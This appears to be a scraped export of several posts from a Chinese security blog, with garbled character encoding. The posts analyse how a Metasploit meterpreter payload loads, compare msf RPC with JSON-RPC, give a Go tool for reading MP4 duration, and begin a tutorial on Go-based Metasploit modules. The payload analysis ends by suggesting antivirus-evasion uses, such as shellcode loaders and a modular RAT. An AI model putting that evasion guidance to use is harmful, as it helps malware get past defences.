session_guid[sizeof(GUID)]; ///! Current session GUID } MetsrvSession; typedef struct _MetsrvTransportCommon { CHARTYPE url[URL_SIZE]; ///! Transport url: scheme://host:port/URI int comms_timeout; ///! Number of sessions to wait for a new packet. int retry_total; ///! Total seconds to retry comms for. int retry_wait; ///! Seconds to wait between reconnects. } MetsrvTransportCommon; è¿™äº›ä¿¡æ¯å¾ˆæ˜æ˜¾èƒ½çœ‹åˆ°æ˜¯ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚uuidï¼Œé‡è¯•æ¬¡æ•°ä¹‹ç±»çš„ï¼Œè¿™äº›åœ¨payloadçš„ç”Ÿæˆé€‰é¡¹é‡Œé¢éƒ½èƒ½æ‰¾åˆ°\né‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å·®ä¸å¤šæ˜ç™½äº†ï¼Œè¿™ä¸€å—çš„ä¸œè¥¿æ˜¯å¼ºè½¬æˆäº†è¿™ä¸ªç»“æ„ä½“ï¼ŒåŒ…æ‹¬ediä¸­æ‰€å­˜æ”¾çš„socketå¥æŸ„åœ°å€\nå¥½å§ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬çš„ä½¿å‘½ï¼Œææ¸…æ¥šè¿™ä¸ªediçš„ä½œç”¨\nåˆ’å…¥è¿™ä¸ªç»“æ„ä½“ä¹Ÿå°±æ˜¯\n1 2 3 4 5 union { UINT_PTR handle; BYTE padding[8]; } comms_handle; ///! Socket/handle for communications (if there is one). ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰¾æ‰¾ comms_handle ç”¨åœ¨äº†å“ª\næ‰€ä»¥è¿›åˆ° Init((MetsrvConfig*)lpReserved) é‡Œé¢çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 DWORD Init(MetsrvConfig* metConfig) { // if hAppInstance is still == NULL it means that we havent been // reflectivly loaded so we must patch in the hAppInstance value // for use with loading server extensions later. InitAppInstance(); // In the case of metsrv payloads, the parameter passed to init is NOT a socket, it\u0026#39;s actually // a pointer to the metserv configuration, so do a nasty cast and move on. dprintf(\u0026#34;[METSRV] Getting ready to init with config %p\u0026#34;, metConfig); DWORD result = server_setup(metConfig); dprintf(\u0026#34;[METSRV] Exiting with %08x\u0026#34;, metConfig-\u0026gt;session.exit_func); // We also handle exit func directly in metsrv now because the value is added to the // configuration block and we manage to save bytes in the stager/header as well. switch (metConfig-\u0026gt;session.exit_func) { case EXITFUNC_SEH: SetUnhandledExceptionFilter(NULL); break; case EXITFUNC_THREAD: ExitThread(0); break; case EXITFUNC_PROCESS: ExitProcess(0); break; default: break; } return result; } é‡Œé¢è°ƒç”¨äº† server_setup ç„¶ååå‡ºäº†ç»“æœï¼Œæœ€åè¿”å›ï¼Œè·Ÿåˆ°å¤–å±‚ä¹Ÿå°±æ˜¯dllmainçš„è¿”å›å€¼ï¼Œdllmainè¿”å›å€¼ä½œç”¨æˆ‘ä¸èµ˜è¿°äº†ï¼Œç„¶åæ ¹æ®ä½ çš„ç”Ÿæˆé€‰é¡¹ä¸­çš„ EXITFUNC æ¥è¿›è¡Œé€€å‡ºï¼Œé€€å‡ºè¿›ç¨‹ã€çº¿ç¨‹æˆ–è€…SEHå¼‚å¸¸ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç®¡ï¼Œæˆ‘ä»¬çœ‹çœ‹ server_setup å‡½æ•°\nserver_setupå‡½æ•°å¾ˆé•¿ï¼Œæˆ‘å°±ä¸è´´æ•´ä¸ªå‡½æ•°äº†\nä½¿ç”¨äº† comms_handle çš„æˆ‘è´´ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 ... dprintf(\u0026#34;[SESSION] Comms handle: %u\u0026#34;, config-\u0026gt;session.comms_handle); ... dprintf(\u0026#34;[DISPATCH] Transport handle is %p\u0026#34;, (LPVOID)config-\u0026gt;session.comms_handle.handle); if (remote-\u0026gt;transport-\u0026gt;set_handle) { remote-\u0026gt;transport-\u0026gt;set_handle(remote-\u0026gt;transport, config-\u0026gt;session.comms_handle.handle); } æ ¹æ®è¿™äº›ä»£ç æˆ‘ä»¬èƒ½å¤ŸçŸ¥é“æ˜¯æŠŠ Transport handle è®¾ç½®ä¸ºäº†æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„socket\nç»§ç»­å¾€åæ‰¾æˆ‘ä»¬èƒ½æ‰¾åˆ°\nç„¶åè·Ÿè¿› transport_set_handle_tcp å¯ä»¥çœ‹åˆ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /*! * @brief Get the socket from the transport (if it\u0026#39;s TCP). * @param transport Pointer to the TCP transport containing the socket. * @return The current transport socket FD, if any, or zero. */ static UINT_PTR transport_get_handle_tcp(Transport* transport) { if (transport \u0026amp;\u0026amp; transport-\u0026gt;type == METERPRETER_TRANSPORT_TCP) { return (UINT_PTR)((TcpTransportContext*)transport-\u0026gt;ctx)-\u0026gt;fd; } return 0; } /*! * @brief Set the socket from the transport (if it\u0026#39;s TCP). * @param transport Pointer to the TCP transport containing the socket. * @param handle The current transport socket FD, if any. */ static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle) { if (transport \u0026amp;\u0026amp; transport-\u0026gt;type == METERPRETER_TRANSPORT_TCP) { ((TcpTransportContext*)transport-\u0026gt;ctx)-\u0026gt;fd = (SOCKET)handle; } } ä¹Ÿåªæ˜¯è½¬ä¸ºäº†socketå¥æŸ„ï¼Œç„¶åç»™å¤–éƒ¨å†ç»§ç»­é€šè¿‡è¿™ä¸ªsocketå»å–ä¸€äº›æœåŠ¡å™¨ä¸Šçš„ä¸œè¥¿ï¼ˆåé¢çš„æˆ‘æ²¡å†è·Ÿä¸‹å»äº†ï¼Œæˆ‘çŒœæµ‹ä¹Ÿåªæœ‰è¿™ç§å¯èƒ½ï¼‰\næ€»ç»“ è¿™æ¬¡çš„åˆ†æè€—æ—¶ä¸€å¤©ï¼Œä»ä¸Šåˆçœ‹åˆ°è®¨è®ºå…æ€ï¼ŒåŠ è½½å™¨ï¼Œç„¶åå¼€å§‹åˆ†æï¼Œè¯´å®è¯ï¼Œè¿˜æ˜¯æ”¶è·äº†ä¸å°‘ï¼Œæ¯”å¦‚é‚£ä¸ªåå°„dllçš„æ”¹doså¤´å°±è®©æˆ‘ä¸å¾—ä¸ä½©æœï¼Œå§æ§½ï¼Œè¿™æ“ä½œéªšã€‚æœ¬æ¬¡åªæ˜¯æ‹¿ windows/meterpreter/reverse_tcp å¼€åˆ€ï¼Œæˆ‘ç›¸ä¿¡å…¶ä»–çš„ä¹Ÿä¸€æ ·ï¼Œä¸ç„¶ä½•ä»¥è¢«å®˜æ–¹ç§° sockedi è°ƒç”¨çº¦å®šï¼Œè¯´æ˜è¿™å·²ç»æ˜¯msfé‡Œé¢åŠ è½½çš„çº¦å®šæˆä¿—çš„ä¸œè¥¿äº†ã€‚\né‚£ä¹ˆä»è¿™æ¬¡çš„åˆ†æä¸­æˆ‘ä»¬èƒ½è·å¾—å“ªäº›å¯ç¤ºï¼Ÿå½“ç„¶æ˜¯å…æ€å¯¹æŠ—çš„å¯ç¤ºï¼ŒantiAVæ–¹å¯ä»¥é€šè¿‡ç ”ç©¶ä½¿ç”¨è‡ªå·±çš„payloadæ ¼å¼ï¼ŒAVæ–¹å¯ä»¥é€šè¿‡è¿™ä¸ªæµç¨‹æ¥å¯¹msfçš„payloadçš„æŸ¥æ€æ›´ä¸Šä¸€æ­¥ï¼Œæˆ–è€…æ ¹æ®é‡Œé¢çš„æ”¹DOSå¤´æŠ€æœ¯æ‰“é€ è‡ªå·±çš„æ¨¡å—åŒ–RAT\nä¸‹ä¸€æ­¥å¯ä»¥åšçš„ ç ”ç©¶payload uuidçš„å›ä¼  ç ”ç©¶rc4ï¼Œaesä¹‹ç±»çš„æ‰€è°“åŠ å¯†shellcodeï¼ŒåŠ å¯†æ˜¯åœ¨å“ªé‡Œ \u0026hellip; ç°åœ¨å°±å¯ä»¥å¾—åˆ°çš„ å½“ç„¶æ˜¯ä¸€ä¸ªé¦™å–·å–·çš„shellcodeåŠ è½½å™¨ï¼Œå…·ä½“å®ç°å°±æ˜¯å…«ä»™è¿‡æµ·å„æ˜¾ç¥é€šäº†ã€‚ æ”¹DOSå¤´ç›´æ¥æ‰§è¡Œçš„æŠ€æœ¯ ","permalink":"https://www.hacktech.cn/post/what-is-sockedi-call-convention-in-msf.html","summary":"\u003cp\u003eæœ¬ç¯‡æ–‡ç« ä¸»è¦è®¨è®ºä¸€ä¸‹msfå®˜æ–¹æ–‡æ¡£ä¸­æåˆ°çš„sockediè°ƒç”¨çº¦å®šåˆ°åº•æ˜¯æŒ‡ä»€ä¹ˆ?\u003c/p\u003e","title":"metasploit payloadè¿è¡ŒåŸç†æµ…æ(sockediè°ƒç”¨çº¦å®šæ˜¯ä»€ä¹ˆ)"},{"content":"msfçš„rpcæœ‰ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥è°ƒç”¨å“ªä¸€ä¸ªå‘¢ï¼Ÿ\nå…¶ä¸­restfulæ¥å£æš‚ä¸”ä¸è°ˆï¼Œè¿™ä¸ªrest apiå…¶å®æ˜¯ç®€å•å¯¹æ¥äº†ä¸€ä¸‹msfçš„åç«¯æ•°æ®åº“ï¼Œè¿™ä¸ªè‡ªå·±ä¹Ÿèƒ½è¯»æ•°æ®åº“æ¥åšï¼Œè¿™ä¸ªä»¥åæœ‰æ—¶é—´å†è°ˆ\né¦–å…ˆè¯´ä¸‹è¿™ä¸ªjson-rpcï¼Œjson-rpcæ˜¯metasploit5.0æ¨å‡ºçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œé‡‡ç”¨jsonä½œä¸ºäº¤äº’æ ¼å¼ï¼Œä¾‹å¦‚\n1 2 akkuman@DESKTOP-MFL946C ~\u0026gt; curl -k -X POST -H \u0026#34;Accept: application/json\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: Bearer f622f07405f68533c549bc11838c9f1b6b1f14ba5caae75fb726da071b73f8315aaf3b9b0186fc51\u0026#34; -d \u0026#39;{\u0026#34;jsonrpc\u0026#34;: \u0026#34;2.0\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;core.version\u0026#34;, \u0026#34;id\u0026#34;: 1 }\u0026#39; http://192.168.174.136:8081/api/v1/json-rpc {\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;version\u0026#34;:\u0026#34;5.0.87-dev-2dc26db9e1\u0026#34;,\u0026#34;ruby\u0026#34;:\u0026#34;2.6.6 x86_64-linux 2020-03-31\u0026#34;,\u0026#34;api\u0026#34;:\u0026#34;1.0\u0026#34;},\u0026#34;id\u0026#34;:1} è€Œä»¥å‰çš„msfçš„rpcæ˜¯é‡‡ç”¨msgpackä½œä¸ºäº¤äº’æ ¼å¼ï¼Œé™¤äº†æ²¡æœ‰jsonæ–¹ä¾¿ä¹‹å¤–è¿˜æœ‰ä»€ä¹ˆå…¶ä»–çš„åŒºåˆ«å—ï¼Ÿ\nç­”æ¡ˆæ˜¯æ²¡æœ‰çš„\næˆ‘ä»¬çœ‹çœ‹æºç \nlib/msf/core/rpc/json/dispatcher.rb\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # Process the JSON-RPC request. # @param source [String] the JSON-RPC request # @return [String] JSON-RPC response that encapsulates the RPC result # if successful; otherwise, a JSON-RPC error response. def process(source) begin request = parse_json_request(source) if request.is_a?(Array) # If the batch rpc call itself fails to be recognized as an valid # JSON or as an Array with at least one value, the response from # the Server MUST be a single Response object. raise InvalidRequest.new if request.empty? # process batch request response = request.map { |r| process_request(r) } # A Response object SHOULD exist for each Request object, except that # there SHOULD NOT be any Response objects for notifications. # Remove nil responses from response array response.compact! else response = process_request(request) end rescue ParseError, InvalidRequest =\u0026gt; e # If there was an error in detecting the id in the Request object # (e.g. Parse error/Invalid Request), then the id member MUST be # Null. Don\u0026#39;t pass request obj when building the error response. response = self.class.create_error_response(e) rescue RpcError =\u0026gt; e # other JSON-RPC errors should include the id from the Request object response = self.class.create_error_response(e, request) rescue =\u0026gt; e response = self.class.create_error_response(ApplicationServerError.new(e), request) end # When a rpc call is made, the Server MUST reply with a Response, except # for in the case of Notifications. The Response is expressed as a single # JSON Object. self.class.to_json(response) end é‡Œé¢çš„å“åº”æ˜¯ä½¿ç”¨ process_requestï¼Œå¾€ä¸‹è·Ÿ\nlib/msf/core/rpc/json/dispatcher.rb\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # Validate and execute the JSON-RPC request. # @param request [Hash] the JSON-RPC request # @returns [RpcCommand] an RpcCommand for the specified version # @raise [InvalidParams] ArgumentError occurred during execution. # @raise [ApplicationServerError] General server-error wrapper around an # Msf::RPC::Exception that occurred during execution. # @returns [Hash] JSON-RPC response that encapsulates the RPC result # if successful; otherwise, a JSON-RPC error response. def process_request(request) begin if !validate_rpc_request(request) response = self.class.create_error_response(InvalidRequest.new) return response end # dispatch method execution to command result = @command.execute(request[:method], request[:params]) # A Notification is a Request object without an \u0026#34;id\u0026#34; member. A Request # object that is a Notification signifies the Client\u0026#39;s lack of interest # in the corresponding Response object, and as such no Response object # needs to be returned to the client. The Server MUST NOT reply to a # Notification, including those that are within a batch request. if request.key?(:id) response = self.class.create_success_response(result, request) else response = nil end response rescue ArgumentError raise InvalidParams.new rescue Msf::RPC::Exception =\u0026gt; e raise ApplicationServerError.new(e.message, data: { code: e.code }) end end å¯ä»¥çœ‹åˆ° @command.executeï¼Œå¾€ä¸‹è·Ÿæˆ‘ä»¬ä¼šå‘ç°å‡ºç°äº†å¥½å‡ ä¸ªï¼Œå¾€ä¸Šçœ‹èƒ½å‘ç°\n1 2 3 4 5 # Set the command. # @param command [RpcCommand] the command used by the Dispatcher. def set_command(command) @command = command end è¯´æ˜ @command æ˜¯ä¸€ä¸ª RpcCommand ç±»å¯¹è±¡ï¼Œä½†æ˜¯å‡ºç°äº†å¥½å‡ ä¸ªè¿™æ ·çš„ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ–­ç‚¹æˆ–è€…æ‰“å° @command æ¥åˆ¤æ–­ï¼Œå…³äºæ€ä¹ˆåœ¨msfä¸Šä¸‹æ–­è°ƒè¯•ä»¥åæœ‰æ—¶é—´å†å†™æ–‡ç« \næˆ‘è¿™é‡Œæ˜¯é€šè¿‡æ‰“å°ï¼Œå‘ç°æ˜¯ Msf::RPC::JSON::V1_0::RpcCommand ç±»ï¼Œå®šä½åˆ°è¿™ä¸ªç±»çš„ execute æ–¹æ³•\nlib/msf/core/rpc/json/v1_0/rpc_command.rb\n1 2 3 4 5 6 7 8 9 10 11 # Invokes the method on the receiver object with the specified params, # returning the method\u0026#39;s return value. # @param method [String] the RPC method name # @param params [Array, Hash] parameters for the RPC call # @returns [Object] the method\u0026#39;s return value. def execute(method, params) result = execute_internal(method, params) result = post_process_result(result, method, params) result end æˆ‘ä»¬å…ˆçœ‹çœ‹ post_process_result\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ... MODULE_EXECUTE_KEY = \u0026#39;module.execute\u0026#39; PAYLOAD_MODULE_TYPE_KEY = \u0026#39;payload\u0026#39; PAYLOAD_KEY = \u0026#39;payload\u0026#39; ... # Perform custom post processing of the execute result data. # @param result [Object] the method\u0026#39;s return value # @param method [String] the RPC method name # @param params [Array, Hash] parameters for the RPC call # @returns [Object] processed method\u0026#39;s return value def post_process_result(result, method, params) # post-process payload module result for JSON output if method == MODULE_EXECUTE_KEY \u0026amp;\u0026amp; params.size \u0026gt;= 2 \u0026amp;\u0026amp; params[0] == PAYLOAD_MODULE_TYPE_KEY \u0026amp;\u0026amp; result.key?(PAYLOAD_KEY) result[PAYLOAD_KEY] = Base64.strict_encode64(result[PAYLOAD_KEY]) end result end å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å¤§è‡´ä¸Šå°±æ˜¯å‡å¦‚è¯·æ±‚çš„json-rpcæ˜¯ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±base64å†è¿”å›ï¼Œè€Œrpcå› ä¸ºä½¿ç”¨çš„msgpackï¼Œæ‰€ä»¥ç›´æ¥è¿”å›çš„äºŒè¿›åˆ¶æµ\nç„¶åæˆ‘ä»¬çœ‹çœ‹ä¸»è¦çš„è°ƒç”¨å‡½æ•° execute_internal\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Internal method that invokes the method on the receiver object with # the specified params, returning the method\u0026#39;s return value. # @param method [String] the RPC method name # @param params [Array, Hash] parameters for the RPC call # @raise [MethodNotFound] The method does not exist # @raise [Timeout::Error] The method failed to terminate in @execute_timeout seconds # @returns [Object] the method\u0026#39;s return value. def execute_internal(method, params) group, base_method = parse_method_group(method) method_name = \u0026#34;rpc_#{base_method}\u0026#34; method_name_noauth = \u0026#34;rpc_#{base_method}_noauth\u0026#34; handler = (find_handler(@legacy_rpc_service.handlers, group, method_name) || find_handler(@legacy_rpc_service.handlers, group, method_name_noauth)) if handler.nil? raise MethodNotFound.new(method) end if handler.respond_to?(method_name_noauth) method_name = method_name_noauth end ::Timeout.timeout(@execute_timeout) do params = prepare_params(params) if params.nil? return handler.send(method_name) elsif params.is_a?(Array) return handler.send(method_name, *params) else return handler.send(method_name, **params) end end end å¯ä»¥çœ‹åˆ°å…ˆç»è¿‡å¤„ç†ä¹‹åï¼Œè°ƒç”¨äº† @legacy_rpc_service å¾—åˆ° handlerï¼Œè€Œè¿™ä¸ª legacy_rpc_service åˆ™åˆæ˜¯è°ƒç”¨äº†åŸå§‹ rpc äº†ï¼Œç„¶åè°ƒç”¨ send æ–¹æ³•æ¥è°ƒç”¨rpcï¼Œæ‰€ä»¥json-rpcå®é™…ä¸Šå°±æ˜¯åœ¨åŸå§‹rpcä¸ŠåŒ…è£…äº†ä¸€å±‚ï¼ŒåŠŸèƒ½ä¸Šå¹¶æ²¡æœ‰å˜åŒ–\nç»“è®º ä¸¤è€…åŠŸèƒ½ç›¸åŒï¼Œç”¨å“ªä¸ªçœ‹ä¸ªäººå–œå¥½\n","permalink":"https://www.hacktech.cn/post/msf-rpc-and-jsonrpc-compare.html","summary":"\u003cp\u003emsfçš„rpcæœ‰ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥è°ƒç”¨å“ªä¸€ä¸ªå‘¢ï¼Ÿ\u003c/p\u003e","title":"msfçš„rpcå’Œjson-rpcï¼Œæˆ‘è¯¥é€‰æ‹©å“ªä¸ªï¼Ÿ"},{"content":"ä¸»è¦åŸç†æ˜¯æ ¹æ®MP4æ–‡æ¡£æ ¼å¼å–åˆ°moovç»“æ„ï¼Œç„¶åè·å–æ—¶é•¿\nå·²ä¸Šä¼ åˆ°github https://github.com/akkuman/mp4info\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; ) // BoxHeader ä¿¡æ¯å¤´ type BoxHeader struct { Size uint32 FourccType [4]byte Size64 uint64 } func main() { file, err := os.Open(os.Args[1]) if err != nil { panic(err) } duration, err := GetMP4Duration(file) if err != nil { panic(err) } fmt.Println(filepath.Base(os.Args[1]), duration) } // GetMP4Duration è·å–è§†é¢‘æ—¶é•¿ï¼Œä»¥ç§’è®¡ func GetMP4Duration(reader io.ReaderAt) (lengthOfTime uint32, err error) { var info = make([]byte, 0x10) var boxHeader BoxHeader var offset int64 = 0 // è·å–moovç»“æ„åç§» for { _, err = reader.ReadAt(info, offset) if err != nil { return } boxHeader = getHeaderBoxInfo(info) fourccType := getFourccType(boxHeader) if fourccType == \u0026#34;moov\u0026#34; { break } // æœ‰ä¸€éƒ¨åˆ†mp4 mdatå°ºå¯¸è¿‡å¤§éœ€è¦ç‰¹æ®Šå¤„ç† if fourccType == \u0026#34;mdat\u0026#34; { if boxHeader.Size == 1 { offset += int64(boxHeader.Size64) continue } } offset += int64(boxHeader.Size) } // è·å–moovç»“æ„å¼€å¤´ä¸€éƒ¨åˆ† moovStartBytes := make([]byte, 0x100) _, err = reader.ReadAt(moovStartBytes, offset) if err != nil { return } // å®šä¹‰timeScaleä¸Durationåç§» timeScaleOffset := 0x1C durationOffest := 0x20 timeScale := binary.BigEndian.Uint32(moovStartBytes[timeScaleOffset : timeScaleOffset+4]) Duration := binary.BigEndian.Uint32(moovStartBytes[durationOffest : durationOffest+4]) lengthOfTime = Duration / timeScale return } // getHeaderBoxInfo è·å–å¤´ä¿¡æ¯ func getHeaderBoxInfo(data []byte) (boxHeader BoxHeader) { buf := bytes.NewBuffer(data) binary.Read(buf, binary.BigEndian, \u0026amp;boxHeader) return } // getFourccType è·å–ä¿¡æ¯å¤´ç±»å‹ func getFourccType(boxHeader BoxHeader) (fourccType string) { fourccType = string(boxHeader.FourccType[:]) return } ","permalink":"https://www.hacktech.cn/post/get-mp4-duration-in-pure-go.html","summary":"\u003cp\u003eä¸»è¦åŸç†æ˜¯æ ¹æ®MP4æ–‡æ¡£æ ¼å¼å–åˆ°moovç»“æ„ï¼Œç„¶åè·å–æ—¶é•¿\u003c/p\u003e","title":"çº¯Golangè·å–MP4è§†é¢‘æ—¶é•¿ä¿¡æ¯"},{"content":"æœ€è¿‘æœ‰ç©ºåœ¨çœ‹msfï¼Œå‘ç°msfé‡Œé¢æœ‰æ¨¡å—çš„æºç æ˜¯golangçš„ï¼Œå»ç¿»äº†ç¿»wikiï¼Œwikiä¸Šé¢çš„ç¼–å†™æ—¥æœŸæ˜¯2018.12.13ï¼Œæœäº†ä¸‹å›½å†…ï¼Œå¥½åƒæ²¡æœ‰è¿™æ–¹é¢çš„æ–‡ç« ï¼Œé‚£å°±è‡ªå·±è·Ÿç€åšåšè®°ä¸ªç¬”è®°\né¦–å…ˆç¬¬ä¸€æ­¥è‡ªç„¶æ˜¯å®‰è£…goï¼Œå®˜æ–¹wikiä¸Šæµ‹è¯•æ˜¯åœ¨1.11.2é€šè¿‡ï¼Œå»ºè®®ä½¿ç”¨ version \u0026gt;= 1.11.2 çš„goï¼Œæ€ä¹ˆå®‰è£…goæˆ‘ä¸å†èµ˜è¿°\næ³¨æ„äº‹é¡¹ æ¨¡å—é™åˆ¶ ä¸è¿‡golangç›®å‰è¿˜åªæ”¯æŒä»¥ä¸‹å‡ ä¸ªmsfæ¨¡å—çš„ç¼–å†™\nremote_exploit remote_exploit_cmd_stager capture_server docs single_scanner single_host_login_scanner multi_scanner ä»£ç é™åˆ¶ ç›®å‰å¹¶ä¸æ”¯æŒç¬¬ä¸‰æ–¹åº“ï¼Œä½†æ˜¯å¯ä»¥åœ¨æ¨¡å—ç›®å½•çš„ share/src æ–‡ä»¶å¤¹ä¸‹æ”¾ç½®ä½ çš„åº“ï¼Œæ•´ä½“ä¸Šæ¥è¯´è¿˜æ˜¯æ¯”è¾ƒé¸¡è‚‹\næ¨¡å—ä¹‹é—´å…¬æœ‰çš„åº“çš„è·¯å¾„åœ¨ lib/msf/core/modules/external/go/src/metasploit ç›®å½•ä¸‹ï¼Œå¯ä»¥è‡ªè¡ŒæŸ¥çœ‹\næ ¼å¼ é¡¶è¡Œ é¦–å…ˆgoæºç æ–‡ä»¶çš„é¡¶è¡Œéœ€è¦æœ‰å¯æ‰§è¡Œçš„æ ‡è¯†ï¼Œéœ€è¦åœ¨æ–‡ä»¶é¡¶è¡Œå†™ä¸Š //usr/bin/env go run \u0026quot;$0\u0026quot; \u0026quot;$@\u0026quot;; exit \u0026quot;$?\u0026quot;\nè¿™ä¸ªåŸå› ä¸»è¦æ˜¯å› ä¸ºmsfæ˜¯åŸºäºrubyçš„ï¼Œæ‰§è¡Œgolangä»£ç çš„è¯éœ€è¦çŸ¥æ™“æ‰§è¡Œè·¯å¾„æˆ–ç¯å¢ƒçš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¿…é¡»æ’å…¥è¿™ä¸€è¡Œ\næ¯”å¦‚\n1 2 3 4 5 6 7 8 //usr/bin/env go run \u0026#34;$0\u0026#34; \u0026#34;$@\u0026#34;; exit \u0026#34;$?\u0026#34; package main import ( \u0026#34;metasploit/module\u0026#34; \u0026#34;net/http\u0026#34; ) å…ƒæ•°æ®ä¿¡æ¯ ä¸‹é¢æ˜¯éœ€è¦å¡«å…¥ä¸€äº›å…ƒæ•°æ®çš„ä¿¡æ¯æ¥åˆå§‹åŒ–ä½ çš„æ¨¡å—ï¼Œè¿™ä¸€éƒ¨åˆ†å’Œrubyæ¯”è¾ƒç±»ä¼¼ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®©msfèƒ½å¤Ÿè¯»å–ã€æœç´¢å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import \u0026#34;metasploit/module\u0026#34; func main() { metadata := \u0026amp;module.Metadata{ Name: \u0026#34;\u0026lt;module name\u0026#34;, Description: \u0026#34;\u0026lt;describe\u0026gt;\u0026#34;, Authors: []string{\u0026#34;\u0026lt;author 1\u0026gt;\u0026#34;, \u0026#34;\u0026lt;author 2\u0026gt;\u0026#34;}, Date: \u0026#34;\u0026lt;date module written\u0026#34;, Type:\u0026#34;\u0026lt;module type\u0026gt;\u0026#34;, Privileged: \u0026lt;true|false\u0026gt;, References: []module.Reference{}, Options: map[string]module.Option{\t\u0026#34;\u0026lt;option 1\u0026#34;: {Type: \u0026#34;\u0026lt;type\u0026gt;\u0026#34;, Description: \u0026#34;\u0026lt;description\u0026gt;\u0026#34;, Required: \u0026lt;true|false\u0026gt;, Default: \u0026#34;\u0026lt;default\u0026gt;\u0026#34;},\t\u0026#34;\u0026lt;option 2\u0026#34;: {Type: \u0026#34;\u0026lt;type\u0026gt;\u0026#34;, Description: \u0026#34;\u0026lt;description\u0026gt;\u0026#34;, Required: \u0026lt;true|false\u0026gt;, Default: \u0026#34;\u0026lt;default\u0026gt;\u0026#34;}, }} module.Init(metadata, \u0026lt;the entry method to your module\u0026gt;) } å¯ä»¥çœ‹åˆ°main()æ–¹æ³•è°ƒç”¨äº†module.Initï¼Œåé¢çš„æ³¨é‡Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ æ¨¡å—çš„å…¥å£æ–¹æ³•\næˆ‘ä»¬åˆšæ‰è¯´è¿‡æ¨¡å—ä¹‹é—´å…¬æœ‰çš„åº“ï¼Œæˆ‘ä»¬è·Ÿåˆ°è¿™é‡Œé¢çœ‹çœ‹è¿™ä¸ª module.Init çš„å®šä¹‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /* * RunCallback represents the method to call from the module */ type RunCallback func(params map[string]interface{}) /* * Initializes the module waiting for input from stdin */ func Init(metadata *Metadata, callback RunCallback) { var req Request err := json.NewDecoder(os.Stdin).Decode(\u0026amp;req) if err != nil { log.Fatalf(\u0026#34;could not decode JSON: %v\u0026#34;, err) } switch strings.ToLower(req.Method) { case \u0026#34;describe\u0026#34;: metadata.Capabilities = []string{\u0026#34;run\u0026#34;} res := \u0026amp;MetadataResponse{\u0026#34;2.0\u0026#34;, req.ID, metadata} if err := rpcSend(res); err != nil { log.Fatalf(\u0026#34;error on running %s: %v\u0026#34;, req.Method, err) } case \u0026#34;run\u0026#34;: params, e := parseParams(req.Parameters) if e != nil { log.Fatal(e) } callback(params) res := \u0026amp;RunResponse{\u0026#34;2.0\u0026#34;, req.ID, RunResult{\u0026#34;Module complete\u0026#34;, \u0026#34;\u0026#34;}} if err := rpcSend(res); err != nil { log.Fatalf(\u0026#34;error on running %s: %v\u0026#34;, req.Method, err) } default: log.Fatalf(\u0026#34;method %s not implemented yet\u0026#34;, req.Method) } } å¯ä»¥çœ‹åˆ°ï¼Œå…¥å£æ–¹æ³•å°±æ˜¯ä¸€ä¸ªå‚æ•°æ ¼å¼ä¸º map[string]interface{} çš„å›è°ƒå‡½æ•°ï¼Œä¸‹é¢çš„ Init ä¹Ÿå¥½ç†è§£ï¼Œé¦–å…ˆæ ¹æ®ä½ çš„ä¼ å…¥å‚æ•°ï¼Œ æŸ¥çœ‹æ˜¯å¦æ˜¯ describe è¿˜æ˜¯ run æŒ‡ä»¤ï¼Œå¦‚æœæ˜¯ run æŒ‡ä»¤å°±æ‰§è¡Œå›è°ƒï¼Œé€»è¾‘ååˆ†ç®€å•ã€‚\nä¾‹å­ msfæ¡†æ¶çš„wikiä¸­ç»™äº†ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/msmail/exchange_enum.go\næˆ‘ä»¬ç›´æ¥é‚£è¿™ä¸ªæ¥åˆ†æä¸€ä¸‹\n1 2 3 4 5 6 